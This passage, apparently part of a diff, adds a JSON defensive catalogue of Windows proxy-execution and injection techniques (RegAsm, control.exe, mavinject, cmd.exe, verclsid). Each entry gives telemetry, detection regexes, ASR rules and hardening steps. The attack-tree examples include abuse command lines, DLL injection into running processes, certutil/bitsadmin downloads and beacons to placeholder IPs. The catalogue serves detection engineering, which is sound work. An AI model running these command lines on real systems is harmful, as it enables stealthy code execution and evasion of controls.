+                           "detection":  "regasm or regsvcs with assemblies from temp or downloads. Child processes after registration.",
+                           "hardening":  [
+                                             "Remove .NET SDK tooling from general-purpose hosts.",
+                                             "Block registration utilities with WDAC."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e example.dll",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Managed DLL dropped"
+                                        },
+                                        {
+                                            "a":  "Registers and runs managed code",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.009",
+                                            "c":  "regasm.exe /U C:\\Users\\Public\\example.dll",
+                                            "d":  "4688 + cmdline; Sysmon 1; 7",
+                                            "p":  "regasm.exe"
+                                        },
+                                        {
+                                            "t":  "T1218.009",
+                                            "s":  "Assembly load",
+                                            "p":  "regasm.exe -\u003e example.dll",
+                                            "d":  "Sysmon 7; .NET runtime",
+                                            "a":  "DLL runs in the signed host"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "regasm.exe -\u003e 203.0.113.62:443",
+                                            "d":  "Sysmon 22",
+                                            "a":  "Managed payload beacons"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "RegAsm or RegSvcs on a user-path DLL is the pattern; both are developer tools that should not run on endpoints.",
+                                       "m":  [
+                                                 "regasm(\\.exe)?\\s+.*\\\\(Temp|Users\\\\Public|Downloads)\\\\.*\\.dll",
+                                                 "regsvcs(\\.exe)?\\s+.*\\\\(Temp|Users\\\\Public|Downloads)\\\\.*\\.dll"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Egress from regasm.exe is abnormal outside a deployment window.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Remove .NET SDK tooling from endpoints.",
+                                       "Alert on user-path DLL registration.",
+                                       "Enable Sysmon 7 for the image load.",
+                                       "WDAC allow-list for signed assemblies."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.002",
+                           "name":  "Control Panel",
+                           "host":  "control.exe",
+                           "path":  "C:\\Windows\\System32\\control.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "medium",
+                           "abuse":  "Loads .cpl applets, including files from user-writable paths.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "control.exe loading a .cpl file from temp or downloads. control.exe spawning cmd or powershell.",
+                           "hardening":  [
+                                             "Block unsigned .cpl files with WDAC or AppLocker.",
+                                             "Restrict Control Panel applets to approved paths."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e example.cpl",
+                                            "d":  "Sysmon 11",
+                                            "a":  "Control panel applet or DLL dropped"
+                                        },
+                                        {
+                                            "a":  "Launches a user-supplied applet",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.002",
+                                            "c":  "control.exe C:\\Users\\Public\\example.cpl",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "control.exe"
+                                        },
+                                        {
+                                            "t":  "T1218.002",
+                                            "s":  "DLL load",
+                                            "p":  "control.exe -\u003e example.dll",
+                                            "d":  "Sysmon 7",
+                                            "a":  "Applet code runs in the signed host"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "control.exe -\u003e 203.0.113.63:443",
+                                            "d":  "Sysmon 22",
+                                            "a":  "Applet beacons"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "control.exe with a file path is not normal use; applets are normally opened by name.",
+                                       "m":  [
+                                                 "control(\\.exe)?\\s+.*\\\\\\\\(Temp|Users\\\\Public|Downloads)\\\\.*\\.(cpl|dll)",
+                                                 "control(\\.exe)?\\s+.*\\.cpl"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "control.exe egress is abnormal.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Alert on control.exe with a path argument.",
+                                       "Block .cpl from user-writable paths.",
+                                       "Enable Sysmon 7 for DLL loads.",
+                                       "AppLocker allow-list."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.013",
+                           "name":  "Mavinject",
+                           "host":  "mavinject.exe",
+                           "path":  "C:\\Windows\\System32\\mavinject.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "high",
+                           "abuse":  "Injects a DLL into a running process with /INJECTRUNNING.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create",
+                                             "Sysmon 8 create remote thread",
+                                             "Sysmon 7 image load"
+                                         ],
+                           "detection":  "mavinject /INJECTRUNNING. This binary is rare on workstations and is high signal when it appears.",
+                           "hardening":  [
+                                             "Block mavinject with WDAC or AppLocker on general-purpose hosts.",
+                                             "Monitor Sysmon 8 for remote thread creation into sensitive processes."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e example.dll",
+                                            "d":  "Sysmon 11",
+                                            "a":  "DLL dropped and target chosen"
+                                        },
+                                        {
+                                            "a":  "Injects a DLL into a running process",
+                                            "s":  "Process injection",
+                                            "t":  "T1218.013",
+                                            "c":  "mavinject.exe \u003cpid\u003e /INJECTRUNNING C:\\Users\\Public\\example.dll",
+                                            "d":  "4688 + cmdline; Sysmon 1; 8; 10",
+                                            "p":  "mavinject.exe"
+                                        },
+                                        {
+                                            "t":  "T1055.001",
+                                            "s":  "Code execution",
+                                            "p":  "target process",
+                                            "d":  "Sysmon 8/10; 4688 if a child follows",
+                                            "a":  "Remote thread runs the DLL"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "target process -\u003e 203.0.113.64:443",
+                                            "d":  "Sysmon 22 on the target",
+                                            "a":  "Injected code uses the host process network identity"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "mavinject is an App-V component; injection arguments on an endpoint are a strong signal.",
+                                       "m":  [
+                                                 "mavinject(\\.exe)?\\s+.*(/INJECTRUNNING|\\.dll)"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block Office applications from injecting code into other processes",
+                                           "g":  "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84"
+                                       },
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Correlate egress from the injected host process, not from mavinject. Keep Sysmon 8/10 for the injection event.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Block mavinject.exe where App-V is not deployed.",
+                                       "Enable ASR code-injection rules.",
+                                       "Keep Sysmon 8 and 10 and forward them.",
+                                       "Restrict SeDebugPrivilege to administrators."
+                                   ]
+                       },
+                       {
+                           "id":  "T1059.003",
+                           "name":  "Windows Command Shell",
+                           "host":  "cmd.exe",
+                           "path":  "C:\\Windows\\System32\\cmd.exe",
+                           "family":  "Command and scripting interpreter",
+                           "platform":  "windows",
+                           "group":  "Script Hosts",
+                           "method":  "Interpreter",
+                           "risk":  "medium",
+                           "abuse":  "Chains commands, expands variables and launches other interpreters.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "cmd /c with encoded or heavily concatenated commands. cmd spawning script hosts or network utilities in sequence.",
+                           "hardening":  [
+                                             "Enable command line auditing.",
+                                             "Alert on unusual parent/child chains rather than blocking cmd outright."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "document/script",
+                                            "d":  "4688 parent; Sysmon 1",
+                                            "a":  "Parent composes a command chain"
+                                        },
+                                        {
+                                            "a":  "Runs a chained download and execute",
+                                            "s":  "Execution",
+                                            "t":  "T1059.003",
+                                            "c":  "cmd.exe /c \"...\"",
+                                            "d":  "4688 + cmdline; Sysmon 1",
+                                            "p":  "cmd.exe /c"
+                                        },
+                                        {
+                                            "t":  "T1082",
+                                            "s":  "Discovery",
+                                            "p":  "cmd.exe -\u003e system tools",
+                                            "d":  "4688; Sysmon 1",
+                                            "a":  "whoami, ipconfig, net, tasklist"
+                                        },
+                                        {
+                                            "t":  "T1105",
+                                            "s":  "Egress",
+                                            "p":  "certutil/bitsadmin child -\u003e 203.0.113.65:80",
+                                            "d":  "Sysmon 22; 5156",
+                                            "a":  "Download via a system binary"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "Track cmd.exe where the parent is an Office process or where the child is a download tool.",
+                                       "m":  [
+                                                 "cmd(\\.exe)?\\s+/c\\s+.*(certutil|bitsadmin|powershell|mshta|curl)",
+                                                 "ParentImage.*(winword|excel|outlook)"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block all Office applications from creating child processes",
+                                           "g":  "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "Watch the child process egress, not cmd.exe itself; cmd is the wrapper.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Enable ASR Office child-process blocking.",
+                                       "Alert on Office to cmd.exe.",
+                                       "Keep 4688 with cmdline so the full chain is in one event.",
+                                       "Segment egress through a logging proxy."
+                                   ]
+                       },
+                       {
+                           "id":  "T1218.012",
+                           "name":  "Verclsid",
+                           "host":  "verclsid.exe",
+                           "path":  "C:\\Windows\\System32\\verclsid.exe",
+                           "family":  "System binary proxy execution",
+                           "platform":  "windows",
+                           "group":  "Proxy Execution",
+                           "method":  "Signed system binary",
+                           "risk":  "medium",
+                           "abuse":  "Verifies COM class identifiers and can proxy execution.",
+                           "probe":  "Inventory only.",
+                           "telemetry":  [
+                                             "4688 process creation",
+                                             "Sysmon 1 process create"
+                                         ],
+                           "detection":  "verclsid /S /C {CLSID}, especially when followed by child processes.",
+                           "hardening":  [
+                                             "Block verclsid with WDAC or AppLocker if it is not required.",
+                                             "Restrict COM class activation."
+                                         ],
+                           "needs":  [
+                                         "process"
+                                     ],
+                           "controls":  [
+                                            "cmdline",
+                                            "sysmon",
+                                            "applocker",
+                                            "wdac"
+                                        ],
+                           "tree":  [
+                                        {
+                                            "t":  "T1566.001",
+                                            "s":  "Delivery",
+                                            "p":  "archive -\u003e example.dll",
+                                            "d":  "Sysmon 11; 13",
+                                            "a":  "COM server DLL dropped"
+                                        },
+                                        {
+                                            "a":  "Verifies a COM class and loads its server",
+                                            "s":  "Proxy execution",
+                                            "t":  "T1218.012",
+                                            "c":  "verclsid.exe /S /C {00000000-0000-0000-0000-000000000000}",
+                                            "d":  "4688 + cmdline; Sysmon 1; 7",
+                                            "p":  "verclsid.exe"
+                                        },
+                                        {
+                                            "t":  "T1218.012",
+                                            "s":  "DLL load",
+                                            "p":  "verclsid.exe -\u003e example.dll",
+                                            "d":  "Sysmon 7; 12/13",
+                                            "a":  "COM server runs in the signed host"
+                                        },
+                                        {
+                                            "t":  "T1071.001",
+                                            "s":  "Egress",
+                                            "p":  "verclsid.exe -\u003e 203.0.113.66:443",
+                                            "d":  "Sysmon 22",
+                                            "a":  "COM server beacons"
+                                        }
+                                    ],
+                           "cmd":  {
+                                       "w":  "verclsid with /S /C and a class GUID is the known proxy-execution pattern.",
+                                       "m":  [
+                                                 "verclsid(\\.exe)?\\s+.*(/S|/C)\\s+.*\\{"
+                                             ]
+                                   },
+                           "asr":  [
+                                       {
+                                           "n":  "Block executable files unless they meet prevalence, age or trusted list criteria",
+                                           "g":  "01443614-CD74-433A-B99E-2ECDC07BFC25"
+                                       }
+                                   ],
+                           "net":  {
+                                       "w":  "verclsid.exe egress is abnormal.",
+                                       "ports":  "80,443"
+                                   },
+                           "fix":  [
+                                       "Alert on verclsid with /S /C.",
+                                       "Block verclsid.exe for standard users.",
+                                       "Monitor COM class registration.",
+                                       "WDAC allow-list for signed DLLs."
+                                   ]
+                       }
+                   ]
+}
